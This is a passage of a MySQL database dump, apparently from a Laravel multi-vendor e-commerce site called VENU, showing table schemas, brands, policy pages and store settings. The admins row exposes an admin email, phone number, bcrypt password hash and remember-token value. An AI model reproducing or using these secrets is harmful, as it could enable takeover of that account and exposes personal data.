) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admin_wallets`
--

LOCK TABLES `admin_wallets` WRITE;
/*!40000 ALTER TABLE `admin_wallets` DISABLE KEYS */;
INSERT INTO `admin_wallets` VALUES
(1,1,0,0,NULL,NULL,0.00,0.00,0.00,0.00),
(2,1,0,0,'2025-06-23 22:36:57','2025-06-23 22:36:57',0.00,0.00,0.00,0.00);
/*!40000 ALTER TABLE `admin_wallets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `admins`
--

DROP TABLE IF EXISTS `admins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `admins` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(80) DEFAULT NULL,
  `phone` varchar(25) DEFAULT NULL,
  `admin_role_id` bigint(20) NOT NULL DEFAULT 2,
  `image` varchar(30) NOT NULL DEFAULT 'def.png',
  `identify_image` text DEFAULT NULL,
  `identify_type` varchar(255) DEFAULT NULL,
  `identify_number` int(11) DEFAULT NULL,
  `email` varchar(80) NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(80) NOT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  PRIMARY KEY (`id`),
  UNIQUE KEY `admins_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `admins`
--

LOCK TABLES `admins` WRITE;
/*!40000 ALTER TABLE `admins` DISABLE KEYS */;
INSERT INTO `admins` VALUES
(1,'Venu','+880998888112309',1,'def.png',NULL,NULL,NULL,'admin@venu.uz',NULL,'$2y$10$S.N7fOGjcjFqkwmmWtyWWePOShJBjpbm/TXrrnfB1zI5xscZ8OBzi','fnlMs0Eh7m7GPVz7mmzzK49fNMRwLKqKztDsshKHCrxBnp4Jx7rpRKfgFD24','2025-06-23 22:36:57','2025-06-23 22:39:40',1);
/*!40000 ALTER TABLE `admins` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `analytic_scripts`
--

DROP TABLE IF EXISTS `analytic_scripts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `analytic_scripts` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `type` varchar(255) DEFAULT NULL,
  `script_id` text DEFAULT NULL,
  `script` longtext DEFAULT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `analytic_scripts`
--

LOCK TABLES `analytic_scripts` WRITE;
/*!40000 ALTER TABLE `analytic_scripts` DISABLE KEYS */;
INSERT INTO `analytic_scripts` VALUES
(1,'Meta Pixel','meta_pixel',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39'),
(2,'LinkedIn Insight','linkedin_insight',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39'),
(3,'TikTok Tag','tiktok_tag',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39'),
(4,'Snapchat Tag','snapchat_tag',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39'),
(5,'Twitter Tag','twitter_tag',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39'),
(6,'Pinterest Tag','pinterest_tag',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39'),
(7,'Google Tag Manager','google_tag_manager',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39'),
(8,'Google Analytics','google_analytics',NULL,NULL,0,'2025-02-13 08:41:39','2025-02-13 08:41:39');
/*!40000 ALTER TABLE `analytic_scripts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attachments`
--

DROP TABLE IF EXISTS `attachments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `attachments` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `attachable_type` varchar(191) NOT NULL,
  `attachable_id` bigint(20) unsigned NOT NULL,
  `file_type` varchar(191) DEFAULT NULL,
  `file_name` varchar(191) DEFAULT NULL,
  `storage_disk` varchar(191) NOT NULL DEFAULT 'public',
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `attachments_attachable_type_attachable_id_index` (`attachable_type`,`attachable_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attachments`
--

LOCK TABLES `attachments` WRITE;
/*!40000 ALTER TABLE `attachments` DISABLE KEYS */;
/*!40000 ALTER TABLE `attachments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `attributes`
--

DROP TABLE IF EXISTS `attributes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `attributes` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attributes`
--

LOCK TABLES `attributes` WRITE;
/*!40000 ALTER TABLE `attributes` DISABLE KEYS */;
/*!40000 ALTER TABLE `attributes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `authors`
--

DROP TABLE IF EXISTS `authors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `authors` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `authors`
--

LOCK TABLES `authors` WRITE;
/*!40000 ALTER TABLE `authors` DISABLE KEYS */;
/*!40000 ALTER TABLE `authors` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `banners`
--

DROP TABLE IF EXISTS `banners`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `banners` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `photo` varchar(255) DEFAULT NULL,
  `banner_type` varchar(255) NOT NULL,
  `theme` varchar(255) NOT NULL DEFAULT 'default',
  `published` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `resource_type` varchar(191) DEFAULT NULL,
  `resource_id` bigint(20) DEFAULT NULL,
  `title` varchar(191) DEFAULT NULL,
  `sub_title` varchar(191) DEFAULT NULL,
  `button_text` varchar(191) DEFAULT NULL,
  `background_color` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `banners`
--

LOCK TABLES `banners` WRITE;
/*!40000 ALTER TABLE `banners` DISABLE KEYS */;
/*!40000 ALTER TABLE `banners` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `billing_addresses`
--

DROP TABLE IF EXISTS `billing_addresses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `billing_addresses` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` bigint(20) unsigned DEFAULT NULL,
  `contact_person_name` varchar(191) DEFAULT NULL,
  `address_type` varchar(191) DEFAULT NULL,
  `address` varchar(191) DEFAULT NULL,
  `city` varchar(191) DEFAULT NULL,
  `zip` varchar(191) DEFAULT NULL,
  `phone` varchar(191) DEFAULT NULL,
  `state` varchar(191) DEFAULT NULL,
  `country` varchar(191) DEFAULT NULL,
  `latitude` varchar(191) DEFAULT NULL,
  `longitude` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `billing_addresses`
--

LOCK TABLES `billing_addresses` WRITE;
/*!40000 ALTER TABLE `billing_addresses` DISABLE KEYS */;
/*!40000 ALTER TABLE `billing_addresses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog_categories`
--

DROP TABLE IF EXISTS `blog_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `blog_categories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `slug` mediumtext NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT 1,
  `click_count` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `blog_categories_name_unique` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog_categories`
--

LOCK TABLES `blog_categories` WRITE;
/*!40000 ALTER TABLE `blog_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `blog_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog_seos`
--

DROP TABLE IF EXISTS `blog_seos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `blog_seos` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `blog_id` int(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `index` varchar(255) DEFAULT NULL,
  `no_follow` varchar(255) DEFAULT NULL,
  `no_image_index` varchar(255) DEFAULT NULL,
  `no_archive` varchar(255) DEFAULT NULL,
  `no_snippet` varchar(255) DEFAULT NULL,
  `max_snippet` varchar(255) DEFAULT NULL,
  `max_snippet_value` varchar(255) DEFAULT NULL,
  `max_video_preview` varchar(255) DEFAULT NULL,
  `max_video_preview_value` varchar(255) DEFAULT NULL,
  `max_image_preview` varchar(255) DEFAULT NULL,
  `max_image_preview_value` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog_seos`
--

LOCK TABLES `blog_seos` WRITE;
/*!40000 ALTER TABLE `blog_seos` DISABLE KEYS */;
/*!40000 ALTER TABLE `blog_seos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blog_translations`
--

DROP TABLE IF EXISTS `blog_translations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `blog_translations` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `translation_type` varchar(255) NOT NULL,
  `translation_id` bigint(20) unsigned NOT NULL,
  `locale` varchar(255) NOT NULL,
  `key` varchar(255) DEFAULT NULL,
  `value` text DEFAULT NULL,
  `is_draft` tinyint(4) DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `blog_translations_translation_id_index` (`translation_id`),
  KEY `blog_translations_locale_index` (`locale`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blog_translations`
--

LOCK TABLES `blog_translations` WRITE;
/*!40000 ALTER TABLE `blog_translations` DISABLE KEYS */;
/*!40000 ALTER TABLE `blog_translations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `blogs`
--

DROP TABLE IF EXISTS `blogs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `blogs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `slug` mediumtext NOT NULL,
  `readable_id` varchar(255) NOT NULL,
  `category_id` bigint(20) unsigned DEFAULT NULL,
  `writer` varchar(255) DEFAULT NULL,
  `title` varchar(255) NOT NULL,
  `description` longtext NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `image_storage_type` varchar(15) DEFAULT 'public',
  `draft_image` varchar(255) DEFAULT NULL,
  `draft_image_storage_type` varchar(15) DEFAULT 'public',
  `publish_date` datetime NOT NULL DEFAULT '2025-02-13 14:40:55',
  `is_published` tinyint(4) NOT NULL DEFAULT 0,
  `status` tinyint(4) NOT NULL DEFAULT 0,
  `is_draft` tinyint(4) NOT NULL DEFAULT 0,
  `draft_data` text DEFAULT NULL,
  `click_count` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `blogs`
--

LOCK TABLES `blogs` WRITE;
/*!40000 ALTER TABLE `blogs` DISABLE KEYS */;
/*!40000 ALTER TABLE `blogs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `brands`
--

DROP TABLE IF EXISTS `brands`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `brands` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) DEFAULT NULL,
  `image` varchar(50) NOT NULL DEFAULT 'def.png',
  `image_storage_type` varchar(10) DEFAULT 'public',
  `image_alt_text` varchar(255) DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `brands`
--

LOCK TABLES `brands` WRITE;
/*!40000 ALTER TABLE `brands` DISABLE KEYS */;
INSERT INTO `brands` VALUES
(1,'nokia','2025-07-04-6866e7a9f37bb.webp','public','nokia',1,'2025-07-04 01:27:22','2025-07-04 01:27:22'),
(2,'Iphone','2025-07-04-6866f6d8a7d2d.webp','public','Iphone',1,'2025-07-04 02:32:08','2025-07-04 02:32:08');
/*!40000 ALTER TABLE `brands` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `business_pages`
--

DROP TABLE IF EXISTS `business_pages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `business_pages` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(191) NOT NULL,
  `slug` varchar(191) NOT NULL,
  `description` longtext DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 0,
  `default_status` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `business_pages`
--

LOCK TABLES `business_pages` WRITE;
/*!40000 ALTER TABLE `business_pages` DISABLE KEYS */;
INSERT INTO `business_pages` VALUES
(1,'About Us','about-us','<p>this is about us page. hello and hi from about page description..</p>',1,1,'2025-05-11 07:50:11','2025-05-11 07:50:11'),
(2,'Terms And Conditions','terms-and-conditions','<p>terms and conditions</p>',1,1,'2025-05-11 07:50:11','2025-05-11 07:50:11'),
(3,'Privacy Policy','privacy-policy','<p>my privacy policy</p>\r\n\r\n<p>&nbsp;</p>',1,1,'2025-05-11 07:50:11','2025-05-11 07:50:11'),
(4,'Refund Policy','refund-policy','',1,1,'2025-05-11 07:50:11','2025-05-11 07:50:11'),
(5,'Return Policy','return-policy','',1,1,'2025-05-11 07:50:11','2025-05-11 07:50:11'),
(6,'Cancellation Policy','cancellation-policy','',1,1,'2025-05-11 07:50:11','2025-05-11 07:50:11'),
(7,'Shipping Policy','shipping-policy','',0,1,'2025-05-11 07:50:11','2025-05-11 07:50:11');
/*!40000 ALTER TABLE `business_pages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `business_settings`
--

DROP TABLE IF EXISTS `business_settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `business_settings` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `type` varchar(50) NOT NULL,
  `value` longtext NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=195 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `business_settings`
--

LOCK TABLES `business_settings` WRITE;
/*!40000 ALTER TABLE `business_settings` DISABLE KEYS */;
INSERT INTO `business_settings` VALUES
(1,'system_default_currency','8','2020-10-11 07:43:44','2025-07-05 16:03:42'),
(2,'language','[{\"id\":\"1\",\"name\":\"english\",\"direction\":\"ltr\",\"code\":\"en\",\"status\":1,\"default\":true},{\"id\":2,\"name\":\"O\'zbekcha\",\"direction\":\"ltr\",\"code\":\"uz\",\"status\":1,\"default\":false},{\"id\":3,\"name\":\"\\u0420\\u0443\\u0441\\u0441\\u043a\\u0438\\u0439\",\"direction\":\"ltr\",\"code\":\"ru\",\"status\":1,\"default\":false}]','2020-10-11 07:53:02','2025-07-01 17:32:35'),
(3,'mail_config','{\"status\":0,\"name\":\"demo\",\"host\":\"mail.demo.com\",\"driver\":\"SMTP\",\"port\":\"587\",\"username\":\"info@demo.com\",\"email_id\":\"info@demo.com\",\"encryption\":\"TLS\",\"password\":\"demo\"}','2020-10-12 10:29:18','2021-07-06 12:32:01'),
(4,'cash_on_delivery','{\"status\":\"1\"}',NULL,'2021-05-25 21:21:15'),
(6,'ssl_commerz_payment','{\"status\":\"0\",\"environment\":\"sandbox\",\"store_id\":\"\",\"store_password\":\"\"}','2020-11-09 08:36:51','2023-01-10 05:51:56'),
(10,'company_phone','+998992021001',NULL,'2025-07-05 16:03:42'),
(11,'company_name','VENU',NULL,'2025-07-05 16:03:42'),
(12,'company_web_logo','{\"image_name\":\"2025-06-27-685e62d83108f.webp\",\"storage\":\"public\"}',NULL,'2025-06-27 14:22:32'),
(13,'company_mobile_logo','{\"image_name\":\"2025-06-27-685e62da39fa0.webp\",\"storage\":\"public\"}',NULL,'2025-06-27 14:22:34'),
(16,'sms_nexmo','{\"status\":\"0\",\"nexmo_key\":\"custo5cc042f7abf4c\",\"nexmo_secret\":\"custo5cc042f7abf4c@ssl\"}',NULL,NULL),
(17,'company_email','info@venu.uz',NULL,'2025-07-05 16:03:42'),
(18,'colors','{\"primary\":\"#e8223d\",\"secondary\":\"#000000\",\"panel-sidebar\":\"#000000\",\"primary_light\":null,\"app-primary\":null,\"app-secondary\":null}','2020-10-11 13:53:02','2025-07-01 10:40:28'),
(19,'company_footer_logo','{\"image_name\":\"2025-06-27-685e62d9ecf1a.webp\",\"storage\":\"public\"}',NULL,'2025-06-27 14:22:33'),
(20,'company_copyright_text','© 2025 O‘zbekiston kompaniyasi',NULL,'2025-07-05 16:03:42'),
(21,'download_app_apple_stroe','{\"status\":\"1\",\"link\":\"https:\\/\\/www.target.com\\/s\\/apple+store++now?ref=tgt_adv_XS000000&AFID=msn&fndsrc=tgtao&DFA=71700000012505188&CPNG=Electronics_Portable+Computers&adgroup=Portable+Computers&LID=700000001176246&LNM=apple+store+near+me+now&MT=b&network=s&device=c&location=12&targetid=kwd-81913773633608:loc-12&ds_rl=1246978&ds_rl=1248099&gclsrc=ds\"}',NULL,'2020-12-08 12:54:53'),
(22,'download_app_google_stroe','{\"status\":\"1\",\"link\":\"https:\\/\\/play.google.com\\/store?hl=en_US&gl=US\"}',NULL,'2020-12-08 12:54:48'),
(23,'company_fav_icon','{\"image_name\":\"2025-06-27-685e62da0d5fc.webp\",\"storage\":\"public\"}','2020-10-11 13:53:02','2025-06-27 14:22:34'),
(24,'fcm_topic','',NULL,NULL),
(25,'fcm_project_id','',NULL,NULL),
(26,'push_notification_key','Put your firebase server key here.',NULL,NULL),
(27,'order_pending_message','{\"status\":\"1\",\"message\":\"order pen message\"}',NULL,NULL),
(28,'order_confirmation_msg','{\"status\":\"1\",\"message\":\"Order con Message\"}',NULL,NULL),
(29,'order_processing_message','{\"status\":\"1\",\"message\":\"Order pro Message\"}',NULL,NULL),
(30,'out_for_delivery_message','{\"status\":\"1\",\"message\":\"Order ouut Message\"}',NULL,NULL),
(31,'order_delivered_message','{\"status\":\"1\",\"message\":\"Order del Message\"}',NULL,NULL),
(33,'sales_commission','0',NULL,'2025-07-05 16:03:42'),
(34,'seller_registration','1',NULL,'2021-06-04 21:02:48'),
(35,'pnc_language','[\"en\",\"uz\",\"ru\"]',NULL,'2025-06-27 13:53:33'),
(36,'order_returned_message','{\"status\":\"1\",\"message\":\"Order hh Message\"}',NULL,NULL),
(37,'order_failed_message','{\"status\":null,\"message\":\"Order fa Message\"}',NULL,NULL),
(40,'delivery_boy_assign_message','{\"status\":0,\"message\":\"\"}',NULL,NULL),
(41,'delivery_boy_start_message','{\"status\":0,\"message\":\"\"}',NULL,NULL),
(42,'delivery_boy_delivered_message','{\"status\":0,\"message\":\"\"}',NULL,NULL),
(43,'terms_and_conditions','',NULL,NULL),
(44,'minimum_order_value','1',NULL,NULL),
(48,'currency_model','single_currency',NULL,NULL),
(49,'social_login','[{\"login_medium\":\"google\",\"client_id\":\"\",\"client_secret\":\"\",\"status\":1},{\"login_medium\":\"facebook\",\"client_id\":\"\",\"client_secret\":\"\",\"status\":1}]',NULL,'2025-05-11 07:50:11'),
(50,'digital_payment','{\"status\":\"1\"}',NULL,NULL),
(51,'phone_verification','0',NULL,NULL),
(52,'email_verification','0',NULL,NULL),
(53,'order_verification','0',NULL,NULL),
(54,'country_code','UZ',NULL,'2025-07-05 16:03:42'),
(55,'pagination_limit','10',NULL,'2025-07-05 16:03:42'),
(56,'shipping_method','inhouse_shipping',NULL,NULL),
(59,'forgot_password_verification','email',NULL,NULL),
(61,'stock_limit','10',NULL,NULL),
(64,'announcement','{\"status\":null,\"color\":null,\"text_color\":null,\"announcement\":null}',NULL,NULL),
(65,'fawry_pay','{\"status\":0,\"merchant_code\":\"\",\"security_key\":\"\"}',NULL,'2022-01-18 09:46:30'),
(66,'recaptcha','{\"status\":0,\"site_key\":\"\",\"secret_key\":\"\"}',NULL,'2022-01-18 09:46:30'),
(67,'seller_pos','0',NULL,NULL),
(70,'refund_day_limit','0',NULL,NULL),
(71,'business_mode','multi',NULL,'2025-07-05 16:03:42'),
(72,'mail_config_sendgrid','{\"status\":0,\"name\":\"\",\"host\":\"\",\"driver\":\"\",\"port\":\"\",\"username\":\"\",\"email_id\":\"\",\"encryption\":\"\",\"password\":\"\"}',NULL,NULL),
(73,'decimal_point_settings','2',NULL,'2025-07-05 16:03:42'),
(74,'shop_address','Mirzo Ulugbek District',NULL,'2025-07-05 16:03:42'),
(75,'billing_input_by_customer','1',NULL,NULL),
(76,'wallet_status','0',NULL,NULL),
(77,'loyalty_point_status','0',NULL,NULL),
(78,'wallet_add_refund','0',NULL,NULL),
(79,'loyalty_point_exchange_rate','0',NULL,NULL),
(80,'loyalty_point_item_purchase_point','0',NULL,NULL),
(81,'loyalty_point_minimum_point','0',NULL,NULL),
(82,'minimum_order_limit','1',NULL,NULL),
(83,'product_brand','1',NULL,NULL),
(84,'digital_product','1',NULL,NULL),
(85,'delivery_boy_expected_delivery_date_message','{\"status\":0,\"message\":\"\"}',NULL,NULL),
(86,'order_canceled','{\"status\":0,\"message\":\"\"}',NULL,NULL),
(90,'offline_payment','{\"status\":0}',NULL,'2023-03-04 06:25:36'),
(91,'temporary_close','{\"status\":0}',NULL,'2023-03-04 06:25:36'),
(92,'vacation_add','{\"status\":0,\"vacation_start_date\":null,\"vacation_end_date\":null,\"vacation_note\":null}',NULL,'2023-03-04 06:25:36'),
(93,'cookie_setting','{\"status\":\"1\",\"cookie_text\":\"Bu sayt cookie-fayllardan foydalanadi, qo\\u2018shimcha ma\\u2019lumot uchun siyosatimizni ko\\u2018ring.\"}',NULL,'2025-07-05 16:03:42'),
(94,'maximum_otp_hit','0',NULL,'2023-06-13 13:04:49'),
(95,'otp_resend_time','0',NULL,'2023-06-13 13:04:49'),
(96,'temporary_block_time','0',NULL,'2023-06-13 13:04:49'),
(97,'maximum_login_hit','0',NULL,'2023-06-13 13:04:49'),
(98,'temporary_login_block_time','0',NULL,'2023-06-13 13:04:49'),
(104,'apple_login','[{\"login_medium\":\"apple\",\"client_id\":\"\",\"client_secret\":\"\",\"status\":1,\"team_id\":\"\",\"key_id\":\"\",\"service_file\":\"\",\"redirect_url\":\"\"}]',NULL,'2025-05-11 07:50:11'),
(105,'ref_earning_status','0',NULL,'2023-10-13 05:34:53'),
(106,'ref_earning_exchange_rate','0',NULL,'2023-10-13 05:34:53'),
(107,'guest_checkout','0',NULL,'2023-10-13 11:34:53'),
(108,'minimum_order_amount','0',NULL,'2023-10-13 11:34:53'),
(109,'minimum_order_amount_by_seller','0',NULL,'2023-10-13 11:34:53'),
(110,'minimum_order_amount_status','0',NULL,'2023-10-13 11:34:53'),
(111,'admin_login_url','admin',NULL,'2023-10-13 11:34:53'),
(112,'employee_login_url','employee',NULL,'2023-10-13 11:34:53'),
(113,'free_delivery_status','0',NULL,'2023-10-13 11:34:53'),
(114,'free_delivery_responsibility','admin',NULL,'2023-10-13 11:34:53'),
(115,'free_delivery_over_amount','0',NULL,'2023-10-13 11:34:53'),
(116,'free_delivery_over_amount_seller','0',NULL,'2023-10-13 11:34:53'),
(117,'add_funds_to_wallet','0',NULL,'2023-10-13 11:34:53'),
(118,'minimum_add_fund_amount','0',NULL,'2023-10-13 11:34:53'),
(119,'maximum_add_fund_amount','0',NULL,'2023-10-13 11:34:53'),
(120,'user_app_version_control','{\"for_android\":{\"status\":1,\"version\":\"14.1\",\"link\":\"\"},\"for_ios\":{\"status\":1,\"version\":\"14.1\",\"link\":\"\"}}',NULL,'2023-10-13 11:34:53'),
(121,'seller_app_version_control','{\"for_android\":{\"status\":1,\"version\":\"14.1\",\"link\":\"\"},\"for_ios\":{\"status\":1,\"version\":\"14.1\",\"link\":\"\"}}',NULL,'2023-10-13 11:34:53'),
(122,'delivery_man_app_version_control','{\"for_android\":{\"status\":1,\"version\":\"14.1\",\"link\":\"\"},\"for_ios\":{\"status\":1,\"version\":\"14.1\",\"link\":\"\"}}',NULL,'2023-10-13 11:34:53'),
(123,'whatsapp','{\"status\":1,\"phone\":\"00000000000\"}',NULL,'2023-10-13 11:34:53'),
(124,'currency_symbol_position','right',NULL,'2025-07-05 16:03:42'),
(148,'company_reliability','[{\"item\":\"delivery_info\",\"title\":\"Fast Delivery all across the country\",\"image\":\"\",\"status\":1},{\"item\":\"safe_payment\",\"title\":\"Safe Payment\",\"image\":\"\",\"status\":1},{\"item\":\"return_policy\",\"title\":\"7 Days Return Policy\",\"image\":\"\",\"status\":1},{\"item\":\"authentic_product\",\"title\":\"100% Authentic Products\",\"image\":\"\",\"status\":1}]',NULL,NULL),
